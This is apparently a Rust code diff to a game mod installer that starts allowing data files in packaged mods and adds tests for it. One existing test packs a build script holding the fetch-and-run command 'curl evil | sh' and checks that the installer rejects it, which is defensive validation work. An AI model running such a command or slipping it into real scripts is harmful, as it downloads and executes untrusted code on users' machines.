@@ -85,8 +85,8 @@ const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
 pub const INSTALLED: &str = "horizon-native-mods";
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
-/// Each `.hnmod` is checked again as the registry checks it (only `.rs` and `.toml` under
-/// `mixins/<id>/`, nothing run), so a file edited since its download can't smuggle anything else in.
+/// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
+/// `mixins/<id>/`, plus files under its `data/`, nothing run).
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let out = root().join("installed.incoming");
     let _ = fs::remove_dir_all(&out);
@@ -1018,6 +1018,16 @@ mod tests {
             (found[0].id.as_str(), found[0].horizon.as_deref()),
             ("veinminer", Some(A))
         );
+        pack(
+            "veinminer.hnmod",
+            Some(("mixins/veinminer/data/table.bin", "data")),
+        );
+        let out = installed_mods(&home).unwrap();
+        let path = out.join("veinminer/mixins/veinminer/data/table.bin");
+        assert_eq!(fs::read(&path).unwrap(), b"data");
+        let first = version_for(A, B, &bundles(&out).unwrap()).unwrap();
+        fs::write(path, b"changed").unwrap();
+        assert_ne!(first, version_for(A, B, &bundles(&out).unwrap()).unwrap());
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
